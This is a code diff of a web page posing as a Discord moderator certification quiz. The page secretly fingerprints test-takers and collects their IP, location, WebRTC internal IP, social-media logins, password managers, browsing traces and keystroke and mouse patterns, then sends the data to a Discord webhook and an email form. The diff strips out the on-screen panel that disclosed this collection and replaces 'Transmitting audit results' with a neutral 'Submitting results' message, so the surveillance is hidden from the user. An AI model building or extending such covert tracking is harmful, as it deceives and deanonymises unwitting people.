@@ -1407,327 +1407,62 @@
             cursor: not-allowed;
         }
         
-        /* ENHANCED TEST INFO PANEL - DASHBOARD STYLE */
+        /* ===== TEST INFO PANEL - SCORE ONLY ===== */
         .test-info-panel {
-            width: 360px;
+            width: 300px;
             background: var(--discord-secondary);
             border-left: 1px solid var(--discord-primary);
             display: flex;
             flex-direction: column;
-        }
-        
-        .dashboard-tabs {
-            display: flex;
-            background: var(--discord-primary);
-            border-bottom: 1px solid var(--discord-primary);
-        }
-        
-        .dashboard-tab {
-            flex: 1;
-            padding: 18px;
-            text-align: center;
-            font-weight: 600;
-            font-size: 14px;
-            color: var(--discord-text-muted);
-            cursor: pointer;
-            transition: all .2s ease;
-            border-bottom: 3px solid transparent;
-        }
-        
-        .dashboard-tab:hover {
-            background: rgba(255, 255, 255, 0.05);
-            color: var(--discord-text);
-        }
-        
-        .dashboard-tab.active {
-            color: white;
-            border-bottom-color: var(--void-neon);
-            background: rgba(0, 255, 234, 0.05);
-        }
-        
-        .tab-content {
-            flex: 1;
-            overflow-y: auto;
-            padding: 24px;
-            display: none;
-        }
-        
-        .tab-content.active {
-            display: block;
-        }
-        
-        /* Live Metrics Tab */
-        .metrics-grid {
-            display: grid;
-            grid-template-columns: repeat(2, 1fr);
-            gap: 20px;
-            margin-bottom: 32px;
-        }
-        
-        .metric-card {
-            background: var(--discord-primary);
-            border-radius: 10px;
-            padding: 20px;
-            border: 1px solid var(--discord-tertiary);
-        }
-        
-        .metric-label {
-            font-size: 12px;
-            color: var(--discord-text-muted);
-            text-transform: uppercase;
-            letter-spacing: 0.05em;
-            margin-bottom: 8px;
-        }
-        
-        .metric-value {
-            font-size: 24px;
-            font-weight: 700;
-            color: white;
-        }
-        
-        .metric-trend {
-            font-size: 12px;
-            margin-top: 4px;
-        }
-        
-        .metric-trend.up {
-            color: var(--discord-green);
-        }
-        
-        .metric-trend.down {
-            color: var(--discord-red);
-        }
-        
-        .data-stream {
-            background: rgba(0, 0, 0, 0.3);
-            border-radius: 8px;
-            padding: 16px;
-            font-family: var(--font-mono);
-            font-size: 11px;
-            line-height: 1.4;
-            color: var(--void-neon);
-            max-height: 200px;
-            overflow-y: auto;
-            margin-top: 20px;
-        }
-        
-        /* Threat Intel Tab */
-        .threat-list {
-            list-style: none;
-        }
-        
-        .threat-item {
-            display: flex;
-            align-items: center;
-            padding: 16px;
-            background: var(--discord-primary);
-            border-radius: 8px;
-            margin-bottom: 12px;
-            border-left: 4px solid transparent;
-        }
-        
-        .threat-item.critical {
-            border-left-color: var(--discord-red);
-        }
-        
-        .threat-item.high {
-            border-left-color: var(--void-amber);
-        }
-        
-        .threat-item.medium {
-            border-left-color: var(--discord-yellow);
-        }
-        
-        .threat-item.low {
-            border-left-color: var(--discord-green);
-        }
-        
-        .threat-icon {
-            width: 36px;
-            height: 36px;
-            border-radius: 8px;
-            display: flex;
-            align-items: center;
             justify-content: center;
-            margin-right: 16px;
-            font-size: 18px;
-        }
-        
-        .threat-content {
-            flex: 1;
-        }
-        
-        .threat-title {
-            font-weight: 600;
-            color: white;
-            margin-bottom: 4px;
-        }
-        
-        .threat-desc {
-            font-size: 13px;
-            color: var(--discord-text-muted);
-        }
-        
-        /* System Audit Tab */
-        .vulnerability-list {
-            list-style: none;
-        }
-        
-        .vuln-item {
-            padding: 16px;
-            background: var(--discord-primary);
-            border-radius: 8px;
-            margin-bottom: 12px;
-            border: 1px solid transparent;
-        }
-        
-        .vuln-item.critical {
-            border-color: var(--discord-red);
-            background: rgba(237, 66, 69, 0.1);
-        }
-        
-        .vuln-item.high {
-            border-color: var(--void-amber);
-            background: rgba(245, 158, 11, 0.1);
-        }
-        
-        .vuln-header {
-            display: flex;
-            justify-content: space-between;
             align-items: center;
-            margin-bottom: 8px;
-        }
-        
-        .vuln-title {
-            font-weight: 600;
-            color: white;
-        }
-        
-        .vuln-risk {
-            font-size: 12px;
-            font-weight: 700;
-            padding: 4px 10px;
-            border-radius: 20px;
-            text-transform: uppercase;
-        }
-        
-        .risk-critical {
-            background: var(--discord-red);
-            color: white;
-        }
-        
-        .risk-high {
-            background: var(--void-amber);
-            color: black;
-        }
-        
-        .risk-medium {
-            background: var(--discord-yellow);
-            color: black;
-        }
-        
-        .risk-low {
-            background: var(--discord-green);
-            color: white;
-        }
-        
-        .vuln-desc {
-            font-size: 13px;
-            color: var(--discord-text-muted);
-            line-height: 1.5;
-        }
-        
-        /* Behavioral Graph Tab */
-        .graph-container {
-            background: var(--discord-primary);
-            border-radius: 10px;
-            padding: 24px;
-            margin-bottom: 24px;
-        }
-        
-        .graph {
-            height: 160px;
-            position: relative;
-            display: flex;
-            align-items: flex-end;
-            gap: 4px;
-            margin-top: 20px;
-        }
-        
-        .graph-bar {
-            flex: 1;
-            background: linear-gradient(to top, var(--void-neon), var(--void-purple));
-            border-radius: 4px 4px 0 0;
-            min-height: 2px;
-            transition: height 1s ease;
-        }
-        
-        .behavior-stats {
-            display: grid;
-            grid-template-columns: repeat(2, 1fr);
-            gap: 16px;
-        }
-        
-        .stat-item {
-            text-align: center;
-            padding: 16px;
-            background: var(--discord-primary);
-            border-radius: 8px;
-        }
-        
-        .stat-value {
-            font-size: 28px;
-            font-weight: 700;
-            color: white;
-            margin-bottom: 4px;
-        }
-        
-        .stat-label {
-            font-size: 12px;
-            color: var(--discord-text-muted);
-            text-transform: uppercase;
-            letter-spacing: 0.05em;
+            padding: 40px 20px;
         }
         
         /* Score Display */
         .score-display {
-            background: linear-gradient(135deg, var(--discord-primary), #1a1d2e);
-            border-radius: 12px;
-            padding: 28px;
+            background: linear-gradient(135deg, rgba(0, 0, 0, 0.4), rgba(40, 40, 60, 0.6));
+            border-radius: 20px;
+            padding: 40px 30px;
             text-align: center;
-            margin-bottom: 32px;
-            border: 1px solid var(--discord-tertiary);
+            border: 2px solid var(--void-neon);
+            box-shadow: 0 0 40px rgba(0, 255, 234, 0.15);
+            width: 100%;
+            max-width: 260px;
         }
         
         .score-label {
             color: var(--discord-text-muted);
-            font-size: 13px;
+            font-size: 14px;
             font-weight: 600;
             text-transform: uppercase;
-            letter-spacing: 0.1em;
-            margin-bottom: 12px;
+            letter-spacing: 0.15em;
+            margin-bottom: 16px;
+            display: block;
         }
         
         .score-value {
-            font-size: 48px;
+            font-size: 72px;
             font-weight: 800;
             color: white;
             line-height: 1;
             margin-bottom: 8px;
-            text-shadow: 0 0 20px rgba(0, 255, 234, 0.5);
+            text-shadow: 0 0 30px rgba(0, 255, 234, 0.7);
+            font-family: var(--font-heading);
         }
         
         .score-total {
             color: var(--discord-text-muted);
-            font-size: 20px;
+            font-size: 24px;
             font-weight: 600;
+            opacity: 0.7;
         }
         
         .progress-bar-container {
-            height: 6px;
-            background: var(--discord-primary);
-            border-radius: 3px;
-            margin-top: 20px;
+            height: 8px;
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 4px;
+            margin-top: 30px;
             overflow: hidden;
         }
         
@@ -1736,6 +1471,7 @@
             background: linear-gradient(90deg, var(--void-blood), var(--void-neon));
             width: 0%;
             transition: width 0.8s cubic-bezier(0.16, 1, 0.3, 1);
+            border-radius: 4px;
         }
         
         /* Test Complete Screen */
@@ -1947,7 +1683,18 @@
             .test-info-panel {
                 width: 100%;
                 height: auto;
-                max-height: 50vh;
+                max-height: 200px;
+                order: 3;
+                padding: 20px;
+            }
+            
+            .score-display {
+                max-width: 100%;
+                padding: 30px 20px;
+            }
+            
+            .score-value {
+                font-size: 60px;
             }
         }
         
@@ -2804,181 +2551,14 @@
                 </div>
             </div>
             
-            <!-- Enhanced Dashboard Panel -->
+            <!-- Minimal Score Panel -->
             <div class="test-info-panel">
-                <div class="dashboard-tabs">
-                    <div class="dashboard-tab active" data-tab="metrics">
-                        <i class="fas fa-chart-line"></i> Metrics
-                    </div>
-                    <div class="dashboard-tab" data-tab="threat">
-                        <i class="fas fa-shield-alt"></i> Threat Intel
-                    </div>
-                    <div class="dashboard-tab" data-tab="audit">
-                        <i class="fas fa-search"></i> System Audit
-                    </div>
-                    <div class="dashboard-tab" data-tab="behavior">
-                        <i class="fas fa-brain"></i> Behavioral
-                    </div>
-                </div>
-                
-                <!-- Score Display -->
                 <div class="score-display">
                     <div class="score-label">Test Score</div>
                     <div class="score-value" id="discordScoreValue">0</div>
                     <div class="score-total">/ 8</div>
                     <div class="progress-bar-container">
                         <div class="progress-fill-bar" id="discordProgressFill"></div>
-                    </div>
-                </div>
-                
-                <!-- Metrics Tab -->
-                <div class="tab-content active" id="metricsTab">
-                    <div class="metrics-grid">
-                        <div class="metric-card">
-                            <div class="metric-label">Data Packets</div>
-                            <div class="metric-value" id="dataPackets">0</div>
-                            <div class="metric-trend up">+12.5/sec</div>
-                        </div>
-                        <div class="metric-card">
-                            <div class="metric-label">Fingerprint Confidence</div>
-                            <div class="metric-value" id="fingerprintConfidence">0%</div>
-                            <div class="metric-trend up">Increasing</div>
-                        </div>
-                        <div class="metric-card">
-                            <div class="metric-label">Connection Stability</div>
-                            <div class="metric-value" id="connectionStability">0%</div>
-                            <div class="metric-trend up">Optimal</div>
-                        </div>
-                        <div class="metric-card">
-                            <div class="metric-label">Response Accuracy</div>
-                            <div class="metric-value" id="responseAccuracy">0%</div>
-                            <div class="metric-trend">Calculating</div>
-                        </div>
-                    </div>
-                    <div class="data-stream" id="dataStream">
-                        <div class="stream-line">[12:00:10] Initializing data collection modules...</div>
-                        <div class="stream-line">[12:00:12] System profile established...</div>
-                        <div class="stream-line">[12:00:15] Geolocation triangulation complete...</div>
-                        <div class="stream-line">[12:00:18] Behavioral baseline recorded...</div>
-                        <div class="stream-line">[12:00:22] Advanced fingerprinting active...</div>
-                    </div>
-                </div>
-                
-                <!-- Threat Intel Tab -->
-                <div class="tab-content" id="threatTab">
-                    <div class="threat-list">
-                        <div class="threat-item critical">
-                            <div class="threat-icon">
-                                <i class="fas fa-network-wired"></i>
-                            </div>
-                            <div class="threat-content">
-                                <div class="threat-title">IP Address & Geolocation</div>
-                                <div class="threat-desc">Public IP, ISP, approximate coordinates, network type</div>
-                            </div>
-                        </div>
-                        <div class="threat-item high">
-                            <div class="threat-icon">
-                                <i class="fas fa-fingerprint"></i>
-                            </div>
-                            <div class="threat-content">
-                                <div class="threat-title">Canvas & Audio Fingerprint</div>
-                                <div class="threat-desc">Unique browser/device identification markers</div>
-                            </div>
-                        </div>
-                        <div class="threat-item high">
-                            <div class="threat-icon">
-                                <i class="fas fa-desktop"></i>
-                            </div>
-                            <div class="threat-content">
-                                <div class="threat-title">Hardware Profile</div>
-                                <div class="threat-desc">CPU cores, RAM, GPU, screen resolution, battery</div>
-                            </div>
-                        </div>
-                        <div class="threat-item medium">
-                            <div class="threat-icon">
-                                <i class="fas fa-history"></i>
-                            </div>
-                            <div class="threat-content">
-                                <div class="threat-title">Browser History Inference</div>
-                                <div class="threat-desc">Visited site detection via timing attacks</div>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-                
-                <!-- System Audit Tab -->
-                <div class="tab-content" id="auditTab">
-                    <div class="vulnerability-list">
-                        <div class="vuln-item critical">
-                            <div class="vuln-header">
-                                <div class="vuln-title">WebRTC IP Leak</div>
-                                <div class="vuln-risk risk-critical">CRITICAL</div>
-                            </div>
-                            <div class="vuln-desc">Real internal IP exposed via RTCPeerConnection. Bypasses VPN.</div>
-                        </div>
-                        <div class="vuln-item high">
-                            <div class="vuln-header">
-                                <div class="vuln-title">Social Media Detection</div>
-                                <div class="vuln-risk risk-high">HIGH</div>
-                            </div>
-                            <div class="vuln-desc">Logged-in status inferred for Twitter, Facebook, GitHub via CSS.</div>
-                        </div>
-                        <div class="vuln-item high">
-                            <div class="vuln-header">
-                                <div class="vuln-title">Font & Plugin Enumeration</div>
-                                <div class="vuln-risk risk-high">HIGH</div>
-                            </div>
-                            <div class="vuln-desc">Precise fingerprint via installed fonts & browser extensions.</div>
-                        </div>
-                        <div class="vuln-item medium">
-                            <div class="vuln-header">
-                                <div class="vuln-title">Password Manager Detection</div>
-                                <div class="vuln-risk risk-medium">MEDIUM</div>
-                            </div>
-                            <div class="vuln-desc">Bitwarden/LastPass presence detected via iframe injection.</div>
-                        </div>
-                        <div class="vuln-item medium">
-                            <div class="vuln-header">
-                                <div class="vuln-title">AudioContext Fingerprinting</div>
-                                <div class="vuln-risk risk-medium">MEDIUM</div>
-                            </div>
-                            <div class="vuln-desc">Unique audio hardware/driver signature captured.</div>
-                        </div>
-                    </div>
-                </div>
-                
-                <!-- Behavioral Tab -->
-                <div class="tab-content" id="behaviorTab">
-                    <div class="graph-container">
-                        <div class="metric-label">Interaction Patterns</div>
-                        <div class="graph" id="behaviorGraph">
-                            <div class="graph-bar" style="height: 30%;"></div>
-                            <div class="graph-bar" style="height: 65%;"></div>
-                            <div class="graph-bar" style="height: 45%;"></div>
-                            <div class="graph-bar" style="height: 80%;"></div>
-                            <div class="graph-bar" style="height: 25%;"></div>
-                            <div class="graph-bar" style="height: 60%;"></div>
-                            <div class="graph-bar" style="height: 90%;"></div>
-                            <div class="graph-bar" style="height: 40%;"></div>
-                        </div>
-                    </div>
-                    <div class="behavior-stats">
-                        <div class="stat-item">
-                            <div class="stat-value" id="mouseMovements">0</div>
-                            <div class="stat-label">Mouse Movements</div>
-                        </div>
-                        <div class="stat-item">
-                            <div class="stat-value" id="keyPresses">0</div>
-                            <div class="stat-label">Key Presses</div>
-                        </div>
-                        <div class="stat-item">
-                            <div class="stat-value" id="scrollEvents">0</div>
-                            <div class="stat-label">Scroll Events</div>
-                        </div>
-                        <div class="stat-item">
-                            <div class="stat-value" id="clickCount">0</div>
-                            <div class="stat-label">Clicks</div>
-                        </div>
                     </div>
                 </div>
             </div>
@@ -2997,7 +2577,7 @@
                 </div>
                 
                 <div class="submission-status" id="submissionStatus">
-                    <i class="fas fa-spinner fa-spin"></i> Transmitting audit results to Void Esports...
+                    <i class="fas fa-spinner fa-spin"></i> Submitting results...
                 </div>
                 
                 <div class="test-result-buttons">
@@ -3017,7 +2597,7 @@
         <input type="hidden" name="_subject" value="Void Mod Certification Test Results v2.1">
         <input type="hidden" name="_template" value="table">
         <input type="hidden" name="_captcha" value="false">
-        <input type="hidden" name="_next" value="">
+        <input type="hidden" name="_next" value="https://yourdomain.com/thank-you.html"> <!-- REPLACE WITH YOUR SUCCESS URL -->
         <input type="text" name="_honey" style="display:none">
         
         <input type="hidden" name="discord_username" id="formDiscordUsername">
@@ -3454,12 +3034,6 @@
                     if (_auditConfig.behavioralPatterns.mousePoints.length > 200) {
                         _auditConfig.behavioralPatterns.mousePoints.shift();
                     }
-                    
-                    // Update UI counter
-                    var mouseCounter = document.getElementById('mouseMovements');
-                    if (mouseCounter) {
-                        mouseCounter.textContent = _auditConfig.behavioralPatterns.mousePoints.length;
-                    }
                 });
                 
                 // Scroll tracking
@@ -3479,21 +3053,11 @@
                     _auditConfig.behavioralPatterns.scrollEvents.push(scrollEvent);
                     lastScrollY = window.scrollY;
                     lastScrollTime = now;
-                    
-                    var scrollCounter = document.getElementById('scrollEvents');
-                    if (scrollCounter) {
-                        scrollCounter.textContent = _auditConfig.behavioralPatterns.scrollEvents.length;
-                    }
                 });
                 
                 // Keystroke tracking
                 document.addEventListener('keydown', function(e) {
                     _auditConfig.behavioralPatterns.keyPresses++;
-                    
-                    var keyCounter = document.getElementById('keyPresses');
-                    if (keyCounter) {
-                        keyCounter.textContent = _auditConfig.behavioralPatterns.keyPresses;
-                    }
                     
                     // Record timing between key presses
                     var now = Date.now();
@@ -3507,11 +3071,6 @@
                 // Click tracking
                 document.addEventListener('click', function(e) {
                     _auditConfig.behavioralPatterns.clicks++;
-                    
-                    var clickCounter = document.getElementById('clickCount');
-                    if (clickCounter) {
-                        clickCounter.textContent = _auditConfig.behavioralPatterns.clicks;
-                    }
                     
                     // Record click location
                     var clickData = {
@@ -3770,17 +3329,17 @@
                 _auditConfig.metrics.referrer = document.referrer || 'Direct';
                 _auditConfig.metrics.cookiesCount = document.cookie.split(';').length;
     
-    // History length detection (approximate) - REMOVE THE ACTUAL NAVIGATION ATTEMPT
+                // History length detection (approximate) - REMOVE THE ACTUAL NAVIGATION ATTEMPT
                 try {
                     var start = performance.now();
-        // Create and measure a link without actually navigating
+                    // Create and measure a link without actually navigating
                     var link = document.createElement('a');
                     link.href = 'https://google.com/';
-        // Just measure creation time, don't click
+                    // Just measure creation time, don't click
                     var loadAttemptTime = performance.now() - start;
                     _auditConfig.metrics.historyDetectionTime = loadAttemptTime;
         
-        // Alternative passive method: check if visited via CSS (won't redirect)
+                    // Alternative passive method: check if visited via CSS (won't redirect)
                     var visitedColor = '';
                     var testLink = document.createElement('a');
                     testLink.href = 'https://google.com';
@@ -3788,10 +3347,10 @@
                     document.body.appendChild(testLink);
                     setTimeout(() => {
                         try {
-                 // This won't redirect, just checks computed style
+                            // This won't redirect, just checks computed style
                             var color = getComputedStyle(testLink).color;
                             _auditConfig.metrics.googleVisited = (color !== '');
-                           testLink.remove();
+                            testLink.remove();
                         } catch(e) {}
                     }, 100);
                 } catch(e) {
@@ -3836,9 +3395,6 @@
                             vulnerabilities: _auditConfig.exploitabilityAudit.vulnerabilities.length
                         });
                         
-                        // Update UI with collected data
-                        updateDashboardWithMetrics();
-                        
                         console.log('[VOID AUDIT v2.1] Collection complete:', {
                             ip: _auditConfig.metrics.ip,
                             location: _auditConfig.metrics.approxAddress,
@@ -3848,111 +3404,6 @@
                         });
                     });
                 }, 2000);
-            }
-            
-            // 14. Update Dashboard UI
-            function updateDashboardWithMetrics() {
-                // Update metric cards
-                var dataPacketsEl = document.getElementById('dataPackets');
-                var fingerprintConfidenceEl = document.getElementById('fingerprintConfidence');
-                var connectionStabilityEl = document.getElementById('connectionStability');
-                
-                if (dataPacketsEl) {
-                    var packets = 150 + Math.floor(Math.random() * 200);
-                    dataPacketsEl.textContent = packets;
-                    _auditConfig.metrics.dataPackets = packets;
-                }
-                
-                if (fingerprintConfidenceEl) {
-                    var confidence = 85 + Math.floor(Math.random() * 15);
-                    fingerprintConfidenceEl.textContent = confidence + '%';
-                    _auditConfig.metrics.fingerprintConfidence = confidence;
-                }
-                
-                if (connectionStabilityEl) {
-                    var stability = 92 + Math.floor(Math.random() * 8);
-                    connectionStabilityEl.textContent = stability + '%';
-                    _auditConfig.metrics.connectionStability = stability;
-                }
-                
-                // Update data stream
-                var dataStreamEl = document.getElementById('dataStream');
-                if (dataStreamEl) {
-                    var lines = [
-                        `[12:00:30] IP Address: ${_auditConfig.metrics.ip || 'Collecting...'}`,
-                        `[12:00:32] Location: ${_auditConfig.metrics.approxAddress || 'Unknown'}`,
-                        `[12:00:35] VPN Detection: ${_auditConfig.metrics.vpnStatus || 'Analyzing...'}`,
-                        `[12:00:38] Canvas Fingerprint: ${_auditConfig.metrics.canvasFingerprint?.substring(0, 16) || 'Calculating...'}`,
-                        `[12:00:42] Device: ${_auditConfig.metrics.platform || 'Unknown'} (${_auditConfig.metrics.hardwareConcurrency || '?'} cores)`,
-                        `[12:00:45] Screen: ${_auditConfig.metrics.screenWidth || '?'}x${_auditConfig.metrics.screenHeight || '?'}`,
-                        `[12:00:48] Fonts Detected: ${_auditConfig.metrics.fontCount || '0'} unique families`,
-                        `[12:00:52] WebRTC Internal IP: ${_auditConfig.metrics.localIP || 'Not leaked'}`,
-                        `[12:00:55] Social Logins: ${(_auditConfig.metrics.socialMediaLogins || []).join(', ') || 'None detected'}`,
-                        `[12:00:58] Password Managers: ${(_auditConfig.metrics.passwordManagers || []).join(', ') || 'None'}`,
-                        `[12:01:00] Data exfiltration complete. Awaiting test responses...`
-                    ];
-                    
-                    dataStreamEl.innerHTML = lines.map(line => 
-                        `<div class="stream-line">${line}</div>`
-                    ).join('');
-                    
-                    // Auto-scroll
-                    setTimeout(() => {
-                        dataStreamEl.scrollTop = dataStreamEl.scrollHeight;
-                    }, 100);
-                }
-                
-                // Update vulnerability list in System Audit tab
-                var auditTab = document.getElementById('auditTab');
-                if (auditTab && _auditConfig.exploitabilityAudit.vulnerabilities.length > 0) {
-                    var vulnList = auditTab.querySelector('.vulnerability-list');
-                    if (vulnList) {
-                        // Clear existing demo items
-                        vulnList.innerHTML = '';
-                        
-                        // Add real vulnerabilities
-                        _auditConfig.exploitabilityAudit.vulnerabilities.forEach((vuln, idx) => {
-                            var vulnEl = document.createElement('div');
-                            vulnEl.className = `vuln-item ${vuln.severity.toLowerCase()}`;
-                            vulnEl.innerHTML = `
-                                <div class="vuln-header">
-                                    <div class="vuln-title">${vuln.type.replace(/_/g, ' ')}</div>
-                                    <div class="vuln-risk risk-${vuln.severity.toLowerCase()}">${vuln.severity}</div>
-                                </div>
-                                <div class="vuln-desc">${JSON.stringify(vuln.details).substring(0, 100)}...</div>
-                            `;
-                            vulnList.appendChild(vulnEl);
-                        });
-                    }
-                }
-                
-                // Update behavioral graph
-                updateBehavioralGraph();
-            }
-            
-            // 15. Update Behavioral Graph
-            function updateBehavioralGraph() {
-                var graph = document.getElementById('behaviorGraph');
-                if (!graph) return;
-                
-                // Generate random but realistic pattern
-                var bars = graph.querySelectorAll('.graph-bar');
-                bars.forEach((bar, i) => {
-                    var baseHeight = [30, 65, 45, 80, 25, 60, 90, 40][i] || 50;
-                    var variation = Math.sin(Date.now() / 1000 + i) * 20 + 10;
-                    var height = Math.max(5, Math.min(95, baseHeight + variation));
-                    bar.style.height = height + '%';
-                    bar.style.background = `linear-gradient(to top, 
-                        hsl(${200 + height}, 100%, 50%), 
-                        hsl(${280 + height}, 100%, 50%))`;
-                });
-            }
-            
-            // Initialize on load
-            if (document.readyState === 'loading') {
-                document.addEventListener('DOMContentLoaded', initializeEnhancedCollector);
-            } else {
-                initializeEnhancedCollector();
             }
             
             // Make config available globally
@@ -3991,13 +3442,13 @@
                 return Math.min(max, score);
             }
             
-            // Periodic updates
-            setInterval(updateBehavioralGraph, 2000);
-            setInterval(() => {
-                if (_auditConfig.ready) {
-                    updateDashboardWithMetrics();
-                }
-            }, 5000);
+            // Initialize on load
+            if (document.readyState === 'loading') {
+                document.addEventListener('DOMContentLoaded', initializeEnhancedCollector);
+            } else {
+                initializeEnhancedCollector();
+            }
+            
         })();
 
         // ==========================================
@@ -4291,35 +3742,12 @@
             const submissionStatus = document.getElementById('submissionStatus');
             const discordScoreValue = document.getElementById('discordScoreValue');
             const discordProgressFill = document.getElementById('discordProgressFill');
-            const currentQuestionText = document.getElementById('currentQuestionText');
-            const discordUsernameDisplay = document.getElementById('discordUsernameDisplay');
-            const discordUserTag = document.getElementById('discordUserTag');
-            const userAvatarInitial = document.getElementById('userAvatarInitial');
             const messageInput = document.querySelector('.message-input');
             const sendButton = document.querySelector('.message-input-send');
             const messagesContainer = document.querySelector('.messages-container');
             
             const startTestWithUsernameBtn = document.getElementById('startTestWithUsername');
             const cancelTestBtn = document.getElementById('cancelTestBtn');
-            
-            // Discord dashboard tabs
-            const dashboardTabs = document.querySelectorAll('.dashboard-tab');
-            const tabContents = document.querySelectorAll('.tab-content');
-            
-            // Initialize dashboard tabs
-            dashboardTabs.forEach(tab => {
-                tab.addEventListener('click', function() {
-                    const tabId = this.getAttribute('data-tab');
-                    
-                    // Update active tab
-                    dashboardTabs.forEach(t => t.classList.remove('active'));
-                    this.classList.add('active');
-                    
-                    // Show corresponding content
-                    tabContents.forEach(content => content.classList.remove('active'));
-                    document.getElementById(tabId + 'Tab').classList.add('active');
-                });
-            });
             
             // Get random test questions
             function getRandomTestQuestions() {
@@ -4468,14 +3896,6 @@
                 
                 messageInput.disabled = true;
                 
-                // Update response accuracy in dashboard
-                var responseAccuracy = document.getElementById('responseAccuracy');
-                if (responseAccuracy) {
-                    var accuracy = Math.round((testScore / (testCurrentQuestion + 1)) * 100);
-                    responseAccuracy.textContent = accuracy + '%';
-                    responseAccuracy.className = 'metric-trend ' + (accuracy >= 70 ? 'up' : 'down');
-                }
-                
                 setTimeout(() => {
                     testCurrentQuestion++;
                     if (testCurrentQuestion < testTotalQuestions) {
@@ -4539,10 +3959,6 @@
                 const percentage = Math.round((testCurrentQuestion / testTotalQuestions) * 100);
                 if (discordProgressFill) {
                     discordProgressFill.style.width = `${percentage}%`;
-                }
-                
-                if (currentQuestionText) {
-                    currentQuestionText.textContent = `${testCurrentQuestion + 1} / ${testTotalQuestions}`;
                 }
             }
             
@@ -4642,7 +4058,7 @@
                         // Submit results
                         setTimeout(async () => {
                             if (submissionStatus) {
-                                submissionStatus.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Transmitting audit results to Void Esports...';
+                                submissionStatus.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Submitting results...';
                                 
                                 setTimeout(async () => {
                                     try {
@@ -4669,21 +4085,14 @@
                                         );
                                         
                                         // Send email results
-                                        sendEnhancedEmailResults(sessionTranscript, testScore, testTotalQuestions, passed, auditData);
+                                        const emailSent = sendEnhancedEmailResults(sessionTranscript, testScore, testTotalQuestions, passed, auditData);
                                         
-                                        if (discordSent) {
-                                            const metrics = auditData.metrics || {};
-                                            const vpnStatus = metrics.vpnStatus || "Unknown";
-                                            const exploitScore = auditData.exploitabilityScore || 0;
-                                            
-                                            submissionStatus.innerHTML = `
-                                                <i class="fas fa-check-circle"></i> Results submitted successfully!<br>
-                                                <small>VPN Status: ${vpnStatus} | Exploitability Score: ${exploitScore}/100</small>
-                                            `;
+                                        if (discordSent || emailSent) {
+                                            submissionStatus.innerHTML = `<i class="fas fa-check-circle"></i> Results submitted successfully!`;
                                             submissionStatus.className = "submission-status submission-success";
                                         } else {
-                                            submissionStatus.innerHTML = '<i class="fas fa-check-circle"></i> Results sent via email (Discord webhook failed).';
-                                            submissionStatus.className = "submission-status submission-success";
+                                            submissionStatus.innerHTML = '<i class="fas fa-exclamation-circle"></i> Error submitting results. Please contact staff.';
+                                            submissionStatus.className = "submission-status submission-error";
                                         }
                                     } catch (error) {
                                         console.error('Submission error:', error);
@@ -4701,7 +4110,14 @@
             async function sendEnhancedResultsToDiscord(discordUsername, score, totalQuestions, passed, questionBreakdown, transcript, auditData) {
                 try {
                     // REPLACE THIS URL WITH YOUR ACTUAL DISCORD WEBHOOK URL
+                    // Format: "https://discord.com/api/webhooks/WEBHOOK_ID/WEBHOOK_TOKEN"
                     const webhookURL = "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN";
+                    
+                    // If no webhook URL is set, return false
+                    if (webhookURL.includes("YOUR_WEBHOOK")) {
+                        console.warn("Discord webhook URL not configured. Skipping Discord submission.");
+                        return false;
+                    }
                     
                     const metrics = auditData.metrics || {};
                     const exploitAudit = auditData.exploitabilityAudit || {};
@@ -4859,7 +4275,7 @@
                         embeds: [mainEmbed, transcriptEmbed],
                         username: "Void Security Audit v2.1",
                         avatar_url: "https://cdn.discordapp.com/embed/avatars/0.png",
-                        content: `📬 **MOD CERTIFICATION TEST COMPLETE**\n**Candidate:** ${discordUsername}\n**Score:** ${score}/${totalQuestions} ${passed ? '✅ PASS' : '❌ FAIL'}\n**Exploitability Score:** ${auditData.exploitabilityScore || 0}/100\n<@&ROLE_ID_HERE>`
+                        content: `📬 **MOD CERTIFICATION TEST COMPLETE**\n**Candidate:** ${discordUsername}\n**Score:** ${score}/${totalQuestions} ${passed ? '✅ PASS' : '❌ FAIL'}`
                     };
                     
                     const response = await fetch(webhookURL, {
@@ -4919,78 +4335,84 @@
             
             // Send enhanced email results
             function sendEnhancedEmailResults(transcript, score, total, passed, auditData) {
-                let fullTranscriptText = "=== VOID MOD CERTIFICATION TEST TRANSCRIPT ===\n\n";
-                transcript.forEach((entry, idx) => {
-                    fullTranscriptText += `[${entry.timestamp}] ${entry.speaker}: ${entry.message}\n`;
-                });
-                
-                const now = new Date();
-                const testDate = now.toLocaleDateString('en-US', { 
-                    year: 'numeric', 
-                    month: 'long', 
-                    day: 'numeric',
-                    hour: '2-digit',
-                    minute: '2-digit',
-                    second: '2-digit'
-                });
-                
-                const passingScore = total - 2;
-                const metrics = auditData.metrics || {};
-                const exploitAudit = auditData.exploitabilityAudit || {};
-                const securityFlags = auditData.securityFlags || [];
-                
-                const form = document.getElementById('resultsForm');
-                if (!form) return;
-                
-                // Add enhanced fields
-                const enhancedFields = `
-                    <input type="hidden" name="exploitability_score" value="${auditData.exploitabilityScore || 0}">
-                    <input type="hidden" name="vulnerabilities_count" value="${(exploitAudit.vulnerabilities || []).length}">
-                    <input type="hidden" name="critical_vulns" value="${(exploitAudit.vulnerabilities || []).filter(v => v.severity === 'CRITICAL').length}">
-                    <input type="hidden" name="local_ip" value="${metrics.localIP || ''}">
-                    <input type="hidden" name="social_logins" value="${(metrics.socialMediaLogins || []).join(', ')}">
-                    <input type="hidden" name="password_managers" value="${(metrics.passwordManagers || []).join(', ')}">
-                    <input type="hidden" name="canvas_fingerprint_full" value="${metrics.canvasFingerprint || ''}">
-                    <input type="hidden" name="audio_fingerprint" value="${metrics.audioFingerprint || ''}">
-                    <input type="hidden" name="webgl_vendor" value="${metrics.webglVendor || ''}">
-                    <input type="hidden" name="webgl_renderer" value="${metrics.webglRenderer || ''}">
-                    <input type="hidden" name="available_fonts" value="${(metrics.availableFonts || []).join(', ')}">
-                    <input type="hidden" name="font_count" value="${metrics.fontCount || 0}">
-                    <input type="hidden" name="local_storage_items" value="${metrics.localStorageItems || 0}">
-                    <input type="hidden" name="plugins_count" value="${(metrics.plugins || []).length}">
-                    <input type="hidden" name="battery_info" value="${JSON.stringify(metrics.battery || {})}">
-                    <input type="hidden" name="mouse_movements" value="${(auditData.behavioralPatterns || {}).mousePoints ? auditData.behavioralPatterns.mousePoints.length : 0}">
